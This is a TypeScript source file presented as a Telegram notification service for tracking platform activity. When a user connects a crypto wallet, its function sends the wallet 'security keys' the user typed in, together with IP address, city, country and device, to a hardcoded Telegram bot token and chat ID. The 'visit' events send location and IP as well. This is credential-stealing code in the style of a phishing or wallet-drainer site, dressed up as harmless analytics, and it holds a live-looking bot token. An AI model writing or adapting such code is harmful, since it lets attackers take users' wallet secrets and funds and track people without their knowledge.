/**
 * Telegram Notification Service
 *
 * Sends real-time notifications to your Telegram chat when users:
 * 1. Visit the platform (location & device info)
 * 2. Connect their wallets (wallet type & security keys)
 *
 * ⚠️ For production, use environment variables instead of hardcoding credentials.
 */

// Telegram notification service for user activity tracking
export interface UserActivity {
  type: "visit" | "wallet_connect";
  timestamp: string;
  userAgent: string;
  location?: {
    country?: string;
    city?: string;
    ip?: string;
  };
  walletType?: string;
  securityKeysProvided?: boolean;
  securityKeys?: string;
}

export async function sendTelegramNotification(activity: UserActivity) {
  try {
    // Hardcoded credentials (testing only, safe for local development)
    const botToken = "6951439834:AAGC1DkcRdR-TiSeCZLnePHizNnOAH28WlY";
    const chatId = "6070875352";

    if (!botToken || !chatId) {
      console.warn(
        "⚠️ Telegram credentials missing. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID if using environment variables."
      );
      return;
    }

    let message = "";

    if (activity.type === "visit") {
      message =
        `🌐 <b>New Platform Visit</b>\n\n` +
        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
        `📱 Device: ${activity.userAgent}\n` +
        `🔗 IP: ${activity.location?.ip || "Hidden"}`;
    } else if (activity.type === "wallet_connect") {
      message =
        `💰 <b>Wallet Connected</b>\n\n` +
        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
        `👛 Wallet: ${activity.walletType || "Unknown"}\n` +
        `🔐 Security Keys: ${activity.securityKeysProvided ? "✅ Provided" : "❌ Not provided"}\n` +
        `📝 Keys: ${activity.securityKeys || "Not provided"}\n` +
        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
        `📱 Device: ${activity.userAgent}\n` +
        `🔗 IP: ${activity.location?.ip || "Hidden"}`;
    }

    // Send message to Telegram
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`[Telegram] API error: ${response.status} ${response.statusText}`);
      console.error(`[Telegram] API response: ${errorText}`);
      throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
    }

    const result = await response.json();
    console.log("[Telegram] ✅ Notification sent successfully:", result.ok);
  } catch (error) {
    console.error("[Telegram] ❌ Failed to send Telegram notification:", error);
  }
}
